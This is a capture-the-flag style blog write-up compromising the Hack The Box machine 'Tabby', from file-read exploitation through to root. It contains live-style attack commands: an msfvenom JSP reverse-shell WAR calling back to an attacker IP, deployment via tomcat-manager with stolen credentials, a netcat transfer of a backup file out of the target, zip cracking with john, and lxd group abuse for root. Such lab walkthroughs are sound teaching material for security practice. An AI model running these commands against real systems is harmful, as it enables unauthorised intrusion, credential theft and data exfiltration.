---
layout: single
title: "Hack The Box Write-up #5 : Tabby"
excerpt: "Writeup for Tabby, a machine provided by HacktheBox."
date: 2020-11-08
toc: true
toc_sticky: true
header:
  tagline: "Writeup for Tabby , a machine provided by HacktheBox."
  overlay_image: /assets/images/background.jpg
  overlay_filter: 0.5
  actions:
    - label: "Learn More"
      url: "https://www.hackthebox.eu/home/machines/profile/259"
  teaser: /assets/images/tabby-writeup/tabby.png
  teaser_home_page: true
  
categories:
  - hackthebox
tags:  
  - linux
  - cve
  - tomcat
---

![card](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tabby.png)

## Summary
Tabby is an interesting easy box provided by hackthebox where We are represented with a file read vulnerability which we abuse to gain access into the tomcat manager.
Using a classic exploit method , we are able to grab a low privileged shell.
Cracking a zip file leads us to the user password which is part of the ``lxd`` group , thus we can abuse it to gain a system shell.

## Enumeration

### nmap
As always we start by doing a nmap scan against the host :

```sh
root@kali:/home/pi0x73# nmap -sC -sV -T4 10.10.10.194
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 14:50 CET
Nmap scan report for 10.10.10.194
Host is up (0.087s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
```

Some interesting information can be collected through the nmap scan where we see **Tomcat Apache** running on port 8080 , a web page on port 80 and a domain : **megahosting.htb**

First thing, I am going to add the domain to the hosts file and procced through the web page.

### Webpage

Procceding through the webpage, we are represented with a hosting platform service :

![web](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tabby-web.png)

Nothing much interesting till here , but after I while clicking around I saw an interesting piece of code in the page source : 

```html
<li><a href="#pricing">Infrastructure</a></li>
<li><a href="http://megahosting.htb/news.php?file=statement">News</a></li>
<li><a href="#about">About</a></li>
<li><a href="#callus">Support</a></li>
```

### File Read

It seems like all of the buttons redirect to nowhere but news button has an interesting link attached. 
A php page that calls files from system and shows them on the webpage so I though it was possible that we could achieve File Read from the remote host.

![lfi](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/lfi.png)

Obviously the File Read injection was successful and I was able to read files from the system through this vulnerability. 

This could be a lot useful at the moment since we also noticed apache tomcat running on port 8080 , so I started looking around for the ``tomcat-users.xml`` file which holds the credentials configured for the administration panel.

To make the searching easier I installed **tomcat9** on my attacker machine to see where it saves the config files.

![tomcat9](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcat9.png)

Using those paths I was able to retrieve the config file from the remote system : 

```xml
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>

   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

We can easily see the credentials for tomcat running on 8080.

However while trying to connect with the given credentials on [http://10.10.10.194:8080/manager](http://10.10.10.194:8080/manager) I noticed that the I could not access the GUI panel, so I started googling about possible other ways.

After some time I came up with an interesting pip module : **tomcat-manager**, 
which could help me use the panel through CLI .

![tomcatmgr](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcatmgr.png)

I found this module very helpful because not only I was able to connect to the tomcat manager service but I could also upload files through it.

### tomcat shell

So quickly create a payload using msfvenom and drop it to the web service using *tomcatmanager* :

```console
root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.30 LPORT=9001 -f war > shell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes

root@kali:~# tomcat-manager
tomcat-manager> connect http://10.10.10.194:8080/manager tomcat "$3cureP4s5w0rd123!"
--connected to http://10.10.10.194:8080/manager as tomcat
tomcat-manager> deploy local shell.war /zdf
tomcat-manager>
```
With the payload already uploaded to the web server , what's left to do is to navigate on [http://10.10.10.194:8080/zdf](http://10.10.10.194:8080/zdf) in my case to triger the payload and recieve a reverse shell to my machine : 

![tomcat-shell](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcat-shell.png)

## Leveraging Privileges

Upon enumerating inside the box I saw something interesting under ``/var/www/html/files`` : 

![backups](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/backups.png)

I copied this zip backup to my machine to view it contents :

```console
tomcat@tabby:/var/www/html/files$ nc 10.10.15.30 9002 < *.zip


root@kali:~# nc -lvp 9002 > *.zip
Listening on 0.0.0.0 9002
Connection received on megahosting.htb 35208
```

However I wasnt able to view anything because the zip backup was password protected. 

### Cracking the zipfile

In order to unlock it I used **zip2john** to convert the archive into a crackable hash and then give it to john to crack.

```sh
root@kali:~# zip2john backup.zip
backup.zip/var/www/html/assets/ is not encrypted!
ver 1.0 backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
ver 1.0 backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
ver 1.0 efh 5455 efh 7875 backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
backup.zip:$pkzip2$3*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$::backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:backup.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

root@kali:~# john backupfile.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (backup.zip)
1g 0:00:00:01 DONE (2020-11-08 15:49) 0.6849g/s 7097Kp/s 7097Kc/s 7097KC/s adnc153..adenabuck
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

There was nothing useful inside the zip backup but I noticed that user **ash** uses the same password as zip :

![sudo](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/sudo.png)

## Privesc to root

Now as seen above , while using ``id`` command, it pulls out interesting information where ``ash`` is a memeber of **lxd** group.

Members from this group can create and start containers to the machine.
To sumarize that I am able to create a container , start it and then mount the machine filesystem to it.

### Abusing LXD Privileges

I downloaded **alpine** image to the machine which is a preconfigured container and initialized it :

![lxd](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/lxd.png)

This way I can now exeucute ``/bin/bash`` to the container and navigate to the filesystem to read the flag :

```sh
ash@tabby:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root
cd /mnt/root/root
/mnt/root/root # wc -c root.txt
wc -c root.txt
33 root.txt
```
